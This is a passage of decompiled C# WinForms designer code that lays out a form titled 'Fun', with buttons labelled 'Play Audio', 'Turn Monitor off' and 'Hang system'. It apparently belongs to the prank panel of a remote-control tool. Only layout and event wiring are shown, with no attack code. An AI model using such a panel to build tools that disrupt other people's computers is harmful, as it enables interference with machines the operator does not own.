        this.button11.DangerColor = System.Drawing.Color.FromArgb(245, 108, 108);
        this.button11.DefaultColor = System.Drawing.Color.FromArgb(255, 255, 255);
        this.button11.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.button11.HoverTextColor = System.Drawing.Color.FromArgb(48, 49, 51);
        this.button11.InfoColor = System.Drawing.Color.FromArgb(144, 147, 153);
        this.button11.Location = new System.Drawing.Point(173, 26);
        this.button11.Name = "button11";
        this.button11.PrimaryColor = System.Drawing.Color.FromArgb(128, 128, 255);
        this.button11.Size = new System.Drawing.Size(71, 28);
        this.button11.SuccessColor = System.Drawing.Color.FromArgb(103, 194, 58);
        this.button11.TabIndex = 43;
        this.button11.Text = "Start";
        this.button11.TextColor = System.Drawing.Color.White;
        this.button11.WarningColor = System.Drawing.Color.FromArgb(230, 162, 60);
        this.button11.Click += new System.EventHandler(button11_Click);
        this.button15.BorderColor = System.Drawing.Color.FromArgb(220, 223, 230);
        this.button15.ButtonType = ReaLTaiizor.Util.HopeButtonType.Primary;
        this.button15.Cursor = System.Windows.Forms.Cursors.Hand;
        this.button15.DangerColor = System.Drawing.Color.FromArgb(245, 108, 108);
        this.button15.DefaultColor = System.Drawing.Color.FromArgb(255, 255, 255);
        this.button15.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.button15.HoverTextColor = System.Drawing.Color.FromArgb(48, 49, 51);
        this.button15.InfoColor = System.Drawing.Color.FromArgb(144, 147, 153);
        this.button15.Location = new System.Drawing.Point(173, 27);
        this.button15.Name = "button15";
        this.button15.PrimaryColor = System.Drawing.Color.FromArgb(128, 128, 255);
        this.button15.Size = new System.Drawing.Size(71, 28);
        this.button15.SuccessColor = System.Drawing.Color.FromArgb(103, 194, 58);
        this.button15.TabIndex = 44;
        this.button15.Text = "Start";
        this.button15.TextColor = System.Drawing.Color.White;
        this.button15.WarningColor = System.Drawing.Color.FromArgb(230, 162, 60);
        this.button15.Click += new System.EventHandler(button15_Click);
        this.button13.BorderColor = System.Drawing.Color.FromArgb(220, 223, 230);
        this.button13.ButtonType = ReaLTaiizor.Util.HopeButtonType.Primary;
        this.button13.Cursor = System.Windows.Forms.Cursors.Hand;
        this.button13.DangerColor = System.Drawing.Color.FromArgb(245, 108, 108);
        this.button13.DefaultColor = System.Drawing.Color.FromArgb(255, 255, 255);
        this.button13.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.button13.HoverTextColor = System.Drawing.Color.FromArgb(48, 49, 51);
        this.button13.InfoColor = System.Drawing.Color.FromArgb(144, 147, 153);
        this.button13.Location = new System.Drawing.Point(284, 213);
        this.button13.Name = "button13";
        this.button13.PrimaryColor = System.Drawing.Color.FromArgb(128, 128, 255);
        this.button13.Size = new System.Drawing.Size(250, 33);
        this.button13.SuccessColor = System.Drawing.Color.FromArgb(103, 194, 58);
        this.button13.TabIndex = 41;
        this.button13.Text = "Play Audio";
        this.button13.TextColor = System.Drawing.Color.White;
        this.button13.WarningColor = System.Drawing.Color.FromArgb(230, 162, 60);
        this.button13.Click += new System.EventHandler(button13_Click_1);
        this.button12.BorderColor = System.Drawing.Color.FromArgb(220, 223, 230);
        this.button12.ButtonType = ReaLTaiizor.Util.HopeButtonType.Primary;
        this.button12.Cursor = System.Windows.Forms.Cursors.Hand;
        this.button12.DangerColor = System.Drawing.Color.FromArgb(245, 108, 108);
        this.button12.DefaultColor = System.Drawing.Color.FromArgb(255, 255, 255);
        this.button12.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.button12.HoverTextColor = System.Drawing.Color.FromArgb(48, 49, 51);
        this.button12.InfoColor = System.Drawing.Color.FromArgb(144, 147, 153);
        this.button12.Location = new System.Drawing.Point(284, 253);
        this.button12.Name = "button12";
        this.button12.PrimaryColor = System.Drawing.Color.FromArgb(128, 128, 255);
        this.button12.Size = new System.Drawing.Size(250, 33);
        this.button12.SuccessColor = System.Drawing.Color.FromArgb(103, 194, 58);
        this.button12.TabIndex = 42;
        this.button12.Text = "Turn Monitor off";
        this.button12.TextColor = System.Drawing.Color.White;
        this.button12.WarningColor = System.Drawing.Color.FromArgb(230, 162, 60);
        this.button12.Click += new System.EventHandler(button12_Click);
        this.button14.BorderColor = System.Drawing.Color.FromArgb(220, 223, 230);
        this.button14.ButtonType = ReaLTaiizor.Util.HopeButtonType.Primary;
        this.button14.Cursor = System.Windows.Forms.Cursors.Hand;
        this.button14.DangerColor = System.Drawing.Color.FromArgb(245, 108, 108);
        this.button14.DefaultColor = System.Drawing.Color.FromArgb(255, 255, 255);
        this.button14.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.button14.HoverTextColor = System.Drawing.Color.FromArgb(48, 49, 51);
        this.button14.InfoColor = System.Drawing.Color.FromArgb(144, 147, 153);
        this.button14.Location = new System.Drawing.Point(284, 294);
        this.button14.Name = "button14";
        this.button14.PrimaryColor = System.Drawing.Color.FromArgb(128, 128, 255);
        this.button14.Size = new System.Drawing.Size(250, 33);
        this.button14.SuccessColor = System.Drawing.Color.FromArgb(103, 194, 58);
        this.button14.TabIndex = 43;
        this.button14.Text = "Hang system";
        this.button14.TextColor = System.Drawing.Color.White;
        this.button14.WarningColor = System.Drawing.Color.FromArgb(230, 162, 60);
        this.button14.Click += new System.EventHandler(button14_Click);
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.White;
        base.ClientSize = new System.Drawing.Size(542, 351);
        base.Controls.Add(this.button14);
        base.Controls.Add(this.button12);
        base.Controls.Add(this.button13);
        base.Controls.Add(this.hopeForm1);
        base.Controls.Add(this.groupBox7);
        base.Controls.Add(this.groupBox6);
        base.Controls.Add(this.groupBox8);
        base.Controls.Add(this.groupBox9);
        base.Controls.Add(this.groupBox5);
        base.Controls.Add(this.groupBox4);
        base.Controls.Add(this.groupBox3);
        base.Controls.Add(this.groupBox2);
        base.Controls.Add(this.groupBox1);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.MaximizeBox = false;
        this.MaximumSize = new System.Drawing.Size(1920, 1080);
        this.MinimumSize = new System.Drawing.Size(190, 40);
        base.Name = "FormFun";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "Fun";
        base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormFun_FormClosed);
        this.groupBox1.ResumeLayout(false);
        this.groupBox2.ResumeLayout(false);
        this.groupBox3.ResumeLayout(false);
        this.groupBox4.ResumeLayout(false);
        this.groupBox5.ResumeLayout(false);
        this.groupBox6.ResumeLayout(false);
        this.groupBox6.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.numericUpDown1).EndInit();
        this.groupBox7.ResumeLayout(false);
        this.groupBox7.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.numericUpDown2).EndInit();
        this.groupBox9.ResumeLayout(false);
        this.groupBox8.ResumeLayout(false);
        base.ResumeLayout(false);
    }
}